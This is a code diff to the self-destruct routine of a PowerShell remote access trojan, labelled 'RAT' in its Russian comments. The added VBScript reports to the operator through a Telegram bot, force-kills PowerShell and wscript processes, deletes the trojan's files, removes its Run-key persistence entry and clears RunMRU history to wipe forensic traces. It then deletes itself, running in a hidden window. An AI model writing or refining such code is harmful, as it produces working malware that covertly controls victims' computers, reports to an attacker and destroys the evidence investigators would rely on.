@@ -233,34 +233,70 @@ $($fileList -join "`n")"
 On Error Resume Next
 Set WshShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 
-' Ожидание завершения PowerShell процессов
-WScript.Sleep 3000
-
-' Завершение всех процессов PowerShell связанных с RAT
-WshShell.Run "taskkill /f /im powershell.exe", 0, True
-WshShell.Run "taskkill /f /im wscript.exe", 0, True
-
-' Удаление файлов RAT
-fso.DeleteFile "$scriptPath", True
-fso.DeleteFile "$($MyInvocation.MyCommand.Path)", True
-
-' Удаление директории если пустая
-If fso.FolderExists("$scriptDir") Then
-    If fso.GetFolder("$scriptDir").Files.Count = 0 And fso.GetFolder("$scriptDir").SubFolders.Count = 0 Then
-        fso.DeleteFolder "$scriptDir", True
-    End If
-End If
-
-' Очистка реестра
-WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsCoreSystem"
-WshShell.Run "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f", 0, True
-
-' Отправка отчета в Telegram
+' Отправка начального сообщения
 Set http = CreateObject("MSXML2.ServerXMLHTTP")
 http.Open "POST", "https://api.telegram.org/bot$Token/sendMessage", False
 http.setRequestHeader "Content-Type", "application/json"
-http.Send "{""chat_id"": ""$ChatID"", ""text"": ""✅ RAT успешно самоуничтожен. Все следы удалены: файлы, процессы, записи реестра.""}"
+http.Send "{""chat_id"": ""$ChatID"", ""text"": ""🔄 Запущен процесс самоуничтожения RAT...""}"
+
+' Ожидание завершения PowerShell процессов
+WScript.Sleep 5000
+
+' Завершение всех процессов PowerShell
+For Each Process in objWMIService.ExecQuery("Select * from Win32_Process Where Name='powershell.exe'")
+    Process.Terminate()
+Next
+
+' Завершение процессов wscript
+For Each Process in objWMIService.ExecQuery("Select * from Win32_Process Where Name='wscript.exe'")
+    Process.Terminate()
+Next
+
+WScript.Sleep 2000
+
+' Удаление файлов RAT
+If fso.FileExists("$scriptPath") Then
+    fso.DeleteFile "$scriptPath", True
+End If
+
+If fso.FileExists("$($MyInvocation.MyCommand.Path)") Then
+    fso.DeleteFile "$($MyInvocation.MyCommand.Path)", True
+End If
+
+' Удаление директории если пустая
+If fso.FolderExists("$scriptDir") Then
+    fso.DeleteFolder "$scriptDir", True
+End If
+
+' Очистка реестра
+On Error Resume Next
+WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsCoreSystem"
+WshShell.Run "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f", 0, True
+
+' Проверка успешности удаления
+Dim success
+success = True
+
+If fso.FileExists("$scriptPath") Then
+    success = False
+End If
+
+If fso.FolderExists("$scriptDir") Then
+    success = False
+End If
+
+' Отправка отчета в Telegram
+If success Then
+    http.Open "POST", "https://api.telegram.org/bot$Token/sendMessage", False
+    http.setRequestHeader "Content-Type", "application/json"
+    http.Send "{""chat_id"": ""$ChatID"", ""text"": ""✅ RAT успешно самоуничтожен. Все следы удалены: файлы, процессы, записи реестра.""}"
+Else
+    http.Open "POST", "https://api.telegram.org/bot$Token/sendMessage", False
+    http.setRequestHeader "Content-Type", "application/json"
+    http.Send "{""chat_id"": ""$ChatID"", ""text"": ""❌ Ошибка при самоуничтожении RAT. Некоторые файлы не были удалены.""}"
+End If
 
 ' Самоуничтожение VBS скрипта
 fso.DeleteFile WScript.ScriptFullName, True
@@ -272,8 +308,7 @@ fso.DeleteFile WScript.ScriptFullName, True
                             # Запуск VBS скрипта
                             $process = Start-Process -FilePath "wscript.exe" -ArgumentList "//B `"$vbsPath`"" -PassThru -WindowStyle Hidden
                             
-                            Send-Telegram "🔄 Запущен процесс самоуничтожения RAT..."
-                            Start-Sleep 2
+                            # Немедленный выход из основного скрипта
                             exit
                         }
                     }
